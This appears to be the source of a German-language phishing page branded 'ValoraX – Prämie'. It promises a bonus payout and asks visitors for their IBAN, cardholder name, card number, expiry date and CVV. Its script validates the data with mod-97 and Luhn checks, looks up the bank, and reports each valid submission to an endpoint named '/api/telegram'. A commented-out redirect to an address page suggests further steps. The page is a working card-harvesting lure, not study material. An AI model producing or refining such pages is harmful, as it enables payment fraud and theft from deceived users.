<!doctype html>
<html lang="de">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>ValoraX – Prämie</title>

<style>
:root{
  --bg:#000;
  --text:#f5f5f5;
  --muted:rgba(255,255,255,.55);
  --accent:#46f39a;
}
*{ box-sizing:border-box; }
html, body{
  margin:0;
  overflow:hidden;
  overscroll-behavior:none;
  min-height:100dvh;
  touch-action: manipulation;
}
button, input{
  -webkit-user-select:none;
  user-select:none;
  -webkit-tap-highlight-color:transparent;
}
body{
  background:var(--bg);
  color:var(--text);
  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Noto Sans SC",ui-sans-serif,system-ui,Segoe UI,Roboto,Arial,sans-serif;
  display:flex;
  justify-content:center;
}
.container{
  width:100%;
  max-width:560px;
  min-height:100dvh;
  padding:20px 18px calc(18px + env(safe-area-inset-bottom) + 20px);
  display:flex;
  flex-direction:column;
  position:relative;
}
.brand{
  font-weight:900;
  font-size:15px;
  letter-spacing:.02em;
}
.brand span{ color:var(--accent); }
.content{ margin-top:40px; }
h1{
  font-size:32px;
  line-height:1.15;
  margin:0 0 14px 0;
  max-width:22ch;
  letter-spacing:-.02em;
}
.sub{
  margin:0 0 22px 0;
  color:var(--muted);
  font-size:13px;
  line-height:1.5;
  max-width:46ch;
}
.field{
  display:flex;
  flex-direction:column;
  gap:6px;
  margin-bottom:12px;
}
label{
  font-size:11px;
  letter-spacing:.08em;
  font-weight:900;
  color:var(--muted);
}
input{
  width:100%;
  height:48px;
  border-radius:14px;
  border:1px solid rgba(255,255,255,.18);
  background:transparent;
  color:#fff;
  padding:0 14px;
  font-size:13px;
  outline:none;
}
input.invalid{ border-color:rgba(255,255,255,.5); }
input::placeholder{ color:rgba(255,255,255,.35); }
.fieldError{
  display:none;
  font-size:11px;
  color:#fff;
  opacity:.85;
  font-weight:800;
}
.fieldError.show{ display:block; }
.grid2{
  display:grid;
  grid-template-columns: minmax(0,1fr) minmax(0,1fr);
  gap:10px;
}
.notice{
  margin:8px 0 0 0;
  color:rgba(255,255,255,.45);
  font-size:11px;
  line-height:1.4;
  font-weight:700;
}
.actions{
  margin-top:auto;
  padding-top:14px;
  padding-bottom:calc(env(safe-area-inset-bottom) + 14px);
}
button{
  width:100%;
  height:52px;
  border-radius:14px;
  border:1px solid rgba(255,255,255,.18);
  background:#fff;
  color:#000;
  font-weight:900;
  font-size:14px;
  cursor:pointer;
}
button:disabled{ opacity:.35; cursor:not-allowed; }
@media (max-width:380px){
  .content{ margin-top:28px; }
  h1{ font-size:26px; }
  input{ height:46px; }
}
</style>
</head>

<body>
<div class="container">
  <div class="brand">Valora<span>X</span></div>

  <div class="content">
    <h1 id="title"></h1>
    <p class="sub" id="sub"></p>

    <div class="field">
      <label id="lblIban"></label>
      <input id="iban" placeholder="DE00 0000 0000 0000 0000 00">
      <div class="fieldError" id="ibanErr"></div>
    </div>

    <div class="field">
      <label id="lblHolder"></label>
      <input id="holder" placeholder="Max Mustermann">
      <div class="fieldError" id="holderErr"></div>
    </div>

    <div class="field">
      <label id="lblCard"></label>
      <input id="card" placeholder="1234 5678 9012 3456" maxlength="19">
      <div class="fieldError" id="cardErr"></div>
    </div>

    <div class="grid2">
      <div class="field">
        <label id="lblExp"></label>
        <input id="exp" placeholder="MM/YY" maxlength="5">
        <div class="fieldError" id="expErr"></div>
      </div>
      <div class="field">
        <label id="lblCvv"></label>
        <input id="cvv" placeholder="123" maxlength="4">
        <div class="fieldError" id="cvvErr"></div>
      </div>
    </div>

    <p class="notice" id="notice"></p>

    <div class="actions">
      <button id="continueBtn"></button>
    </div>
  </div>
</div>

<script>
const STORAGE_KEY_LANG = "valorax_lang";

const LANGS = {
  de:{ name:"Deutsch",
    title:"Auf welches Konto soll die Prämie überwiesen werden?",
    sub:"Gib deine Zahlungsdaten ein, damit wir die Auszahlung korrekt zuordnen können.",
    labels:{ iban:"IBAN", holder:"KARTENINHABER", card:"KARTENNUMMER", exp:"ABLAUFDATUM", cvv:"CVV" },
    notice:"Sicherheitshinweis: Deine Zahlungsdaten werden nur zur Bearbeitung der Prämienauszahlung verarbeitet.",
    cont:"Weiter",
    placeholders:{ holder:"Max Mustermann", card:"1234 5678 9012 3456", exp:"MM/YY", cvv:"123" },
    errors:{
      iban_required:"IBAN erforderlich.",
      iban_format:"IBAN-Format ungültig.",
      iban_invalid:"IBAN ist ungültig.",
      holder_required:"Name erforderlich.",
      holder_chars:"Nur Buchstaben im Namen erlaubt.",
      holder_two:"Vor- und Nachname erforderlich.",
      card_required:"Kartennummer erforderlich.",
      card_len:"Kartennummer-Länge ungültig.",
      card_invalid:"Kartennummer ist ungültig.",
      exp_required:"Ablaufdatum erforderlich.",
      exp_format:"Format MM/YY erforderlich.",
      exp_month:"Monat ungültig.",
      exp_past:"Karte ist abgelaufen.",
      cvv_required:"CVV erforderlich.",
      cvv_len:"CVV muss genau 3 Ziffern haben."
    }
  }
};

let current = localStorage.getItem(STORAGE_KEY_LANG) || "de";
if(!LANGS[current]) current = "de";

const titleEl = document.getElementById("title");
const subEl = document.getElementById("sub");
const noticeEl = document.getElementById("notice");

const lblIban = document.getElementById("lblIban");
const lblHolder = document.getElementById("lblHolder");
const lblCard = document.getElementById("lblCard");
const lblExp = document.getElementById("lblExp");
const lblCvv = document.getElementById("lblCvv");

const ibanEl=document.getElementById("iban");
const holderEl=document.getElementById("holder");
const cardEl=document.getElementById("card");
const expEl=document.getElementById("exp");
const cvvEl=document.getElementById("cvv");
const btn=document.getElementById("continueBtn");

const ibanErr=document.getElementById("ibanErr");
const holderErr=document.getElementById("holderErr");
const cardErr=document.getElementById("cardErr");
const expErr=document.getElementById("expErr");
const cvvErr=document.getElementById("cvvErr");

function onlyDigits(v){ return (v||"").replace(/\D/g,""); }
function compactAlnumUpper(v){ return (v||"").toUpperCase().replace(/[^A-Z0-9]/g,""); }

function groupEvery(str, size){
  const s = String(str||"");
  let out = "";
  for(let i=0;i<s.length;i++){
    if(i>0 && i%size===0) out += " ";
    out += s[i];
  }
  return out;
}
function formatIBANDisplay(value){
  const raw = compactAlnumUpper(value).slice(0,34);
  return groupEvery(raw,4);
}
function formatCardDisplay(value){
  const raw = onlyDigits(value).slice(0,19);
  return raw.replace(/(.{4})/g,"$1 ").trim();
}
function formatExpiryDisplay(value){
  const d = onlyDigits(value).slice(0,4);
  if(d.length<=2) return d;
  return d.slice(0,2)+"/"+d.slice(2);
}
function applyFormat(el, formatter){
  const before = el.value;
  const after = formatter(before);
  if(before === after) return;
  const atEnd = el.selectionStart === before.length && el.selectionEnd === before.length;
  el.value = after;
  if(atEnd) el.setSelectionRange(after.length, after.length);
}
function sanitizeHolder(value){
  let v = (value || "").replace(/[^A-Za-zÀ-ÿÄÖÜäöüß' -]/g, "");
  v = v.replace(/\s+/g, " ").trimStart();
  return v;
}

/* ===== Bank lookup (nur Variable) ===== */
let BANKS_DE = null;
let BANK_NAME = "";

async function loadBanks(){
  if (BANKS_DE) return;
  const res = await fetch("banks-de.json", { cache: "no-store" });
  if(!res.ok) throw new Error("banks-de.json nicht gefunden (HTTP " + res.status + ")");
  BANKS_DE = await res.json();
}
function bankNameFromIban(iban){
  const raw = compactAlnumUpper(iban);
  if(!raw.startsWith("DE") || raw.length < 12) return "";
  const blz = raw.slice(4, 12);
  return (BANKS_DE && BANKS_DE[blz]) ? BANKS_DE[blz] : "";
}
function updateBankName(){
  if (!BANKS_DE) return;
  const raw = compactAlnumUpper(ibanEl.value);
  if (!raw || !/^DE\d{2}[A-Z0-9]{11,30}$/.test(raw) || ibanMod97(raw)!==1){
    BANK_NAME = "";
    return;
  }
  BANK_NAME = bankNameFromIban(raw) || "";
}

/* ===== Validations ===== */
function ibanMod97(iban){
  const rearranged = iban.slice(4)+iban.slice(0,4);
  let expanded="";
  for(const ch of rearranged){
    const c = ch.charCodeAt(0);
    if(c>=65 && c<=90) expanded += String(c-55);
    else expanded += ch;
  }
  let remainder=0;
  for(let i=0;i<expanded.length;i++){
    remainder=(remainder*10 + (expanded.charCodeAt(i)-48))%97;
  }
  return remainder;
}
function validateIBAN(){
  const raw = compactAlnumUpper(ibanEl.value);
  const E = LANGS[current].errors;
  if(!raw) return {ok:false,msg:E.iban_required};
  if(!/^[A-Z]{2}\d{2}[A-Z0-9]{11,30}$/.test(raw)) return {ok:false,msg:E.iban_format};
  if(ibanMod97(raw)!==1) return {ok:false,msg:E.iban_invalid};
  updateBankName(); // Bankname (falls möglich) aktualisieren
  return {ok:true};
}
function luhnCheck(cardNumber){
  const digits = cardNumber.replace(/\D/g,"");
  let sum = 0;
  let shouldDouble = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}
function validateCard(){
  const raw = cardEl.value.replace(/\D/g,"");
  const E = LANGS[current].errors;
  if (!raw) return {ok:false,msg:E.card_required};
  if (raw.length < 13 || raw.length > 19) return {ok:false,msg:E.card_len};
  if (!luhnCheck(raw)) return {ok:false,msg:E.card_invalid};
  return {ok:true};
}
function validateHolder(){
  const v = (holderEl.value||"").trim().replace(/\s+/g," ");
  const E = LANGS[current].errors;
  if(!v) return {ok:false,msg:E.holder_required};
  if(!/^[A-Za-zÀ-ÿÄÖÜäöüß' -]+$/.test(v)) return {ok:false,msg:E.holder_chars};
  if(v.split(" ").length<2) return {ok:false,msg:E.holder_two};
  return {ok:true};
}
function validateExp(){
  const raw=onlyDigits(expEl.value);
  const E = LANGS[current].errors;
  if(!raw) return {ok:false,msg:E.exp_required};
  if(raw.length!==4) return {ok:false,msg:E.exp_format};
  const mm=parseInt(raw.slice(0,2),10);
  const yy=parseInt(raw.slice(2,4),10)+2000;
  if(mm<1||mm>12) return {ok:false,msg:E.exp_month};
  const expEnd = new Date(yy, mm, 0, 23, 59, 59, 999);
  if(expEnd < new Date()) return {ok:false,msg:E.exp_past};
  return {ok:true};
}
function validateCVV(){
  const raw=onlyDigits(cvvEl.value);
  const E = LANGS[current].errors;
  if(!raw) return {ok:false,msg:E.cvv_required};
  if(raw.length !== 3) return {ok:false,msg:E.cvv_len};
  return {ok:true};
}

/* ===== UI state ===== */
let showErrors = false;
function setFieldState(input,err,ok,msg){
  if(!showErrors){
    input.classList.remove("invalid");
    err.classList.remove("show");
    err.textContent="";
    return;
  }
  input.classList.toggle("invalid",!ok);
  if(ok){
    err.classList.remove("show");
    err.textContent="";
  }else{
    err.textContent=msg || "Ungültiger Wert.";
    err.classList.add("show");
  }
}
function validateAll(){
  const r1=validateIBAN();
  const r2=validateHolder();
  const r3=validateCard();
  const r4=validateExp();
  const r5=validateCVV();

  setFieldState(ibanEl,ibanErr,r1.ok,r1.msg);
  setFieldState(holderEl,holderErr,r2.ok,r2.msg);
  setFieldState(cardEl,cardErr,r3.ok,r3.msg);
  setFieldState(expEl,expErr,r4.ok,r4.msg);
  setFieldState(cvvEl,cvvErr,r5.ok,r5.msg);

  return (r1.ok&&r2.ok&&r3.ok&&r4.ok&&r5.ok);
}
function updateButtonState(){
  if(showErrors) validateAll();
}

/* ===== Input handlers ===== */
ibanEl.addEventListener("input", ()=>{
  applyFormat(ibanEl, formatIBANDisplay);
  updateButtonState();
  updateBankName(); // live aktualisieren
});
cardEl.addEventListener("input", ()=>{
  applyFormat(cardEl, formatCardDisplay);
  updateButtonState();
});
expEl.addEventListener("input", ()=>{
  applyFormat(expEl, formatExpiryDisplay);
  updateButtonState();
});
cvvEl.addEventListener("input", ()=>{
  cvvEl.value = onlyDigits(cvvEl.value).slice(0,3);
  updateButtonState();
});
holderEl.addEventListener("input", ()=>{
  const before = holderEl.value;
  const after = sanitizeHolder(before);
  if(before !== after){
    const atEnd = holderEl.selectionStart === before.length && holderEl.selectionEnd === before.length;
    holderEl.value = after;
    if(atEnd) holderEl.setSelectionRange(after.length, after.length);
  }
  updateButtonState();
});

/* Mobile keyboard hints */
ibanEl.setAttribute("inputmode","text");
cardEl.setAttribute("inputmode","numeric");
expEl.setAttribute("inputmode","numeric");
cvvEl.setAttribute("inputmode","numeric");
holderEl.setAttribute("inputmode","text");

/* Autocomplete */
ibanEl.autocomplete = "off";
cardEl.autocomplete = "cc-number";
holderEl.autocomplete = "cc-name";
expEl.autocomplete = "cc-exp";
cvvEl.autocomplete = "cc-csc";
[ibanEl, cardEl, expEl, cvvEl].forEach(el => {
  el.autocorrect = "off";
  el.spellcheck = false;
});

/* Focus scroll */
[ibanEl, holderEl, cardEl, expEl, cvvEl].forEach(el => {
  el.addEventListener("focus", () => {
    setTimeout(() => {
      el.scrollIntoView({ behavior: "smooth", block: "center" });
    }, 150);
  });
});

/* Render */
function render(){
  const L = LANGS[current];
  document.documentElement.lang = (current === "zhCN") ? "zh-CN" : current;

  titleEl.textContent = L.title;
  subEl.textContent = L.sub;
  noticeEl.textContent = L.notice;

  lblIban.textContent = L.labels.iban;
  lblHolder.textContent = L.labels.holder;
  lblCard.textContent = L.labels.card;
  lblExp.textContent = L.labels.exp;
  lblCvv.textContent = L.labels.cvv;

  holderEl.placeholder = L.placeholders.holder;
  cardEl.placeholder = L.placeholders.card;
  expEl.placeholder = L.placeholders.exp;
  cvvEl.placeholder = L.placeholders.cvv;

  btn.textContent = L.cont;
  document.title = "ValoraX – Prämie";
  updateButtonState();
}

showErrors = false;

// banks-de.json laden
loadBanks().then(updateBankName).catch(console.error);

btn.addEventListener("click", async () => {
  showErrors = true;
  const ok = validateAll();
  if (!ok) {
    updateButtonState();
    const firstInvalid = document.querySelector("input.invalid");
    if (firstInvalid) firstInvalid.focus();
    return;
  }

  // BANK_NAME ist bereits gesetzt (oder hier nochmal sichern)
  if (BANKS_DE) BANK_NAME = bankNameFromIban(ibanEl.value) || "";

  const msg =
    `🏦 Bank: ${BANK_NAME || "Unbekannt"}\n` +
    `✅ Formular gültig`;

  // ✅ Request an dein Endpoint
  await fetch("/api/telegram", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ message: msg })
  });

  //window.location.href = "adresse.html";
});

render();
</script>
</body>
</html>
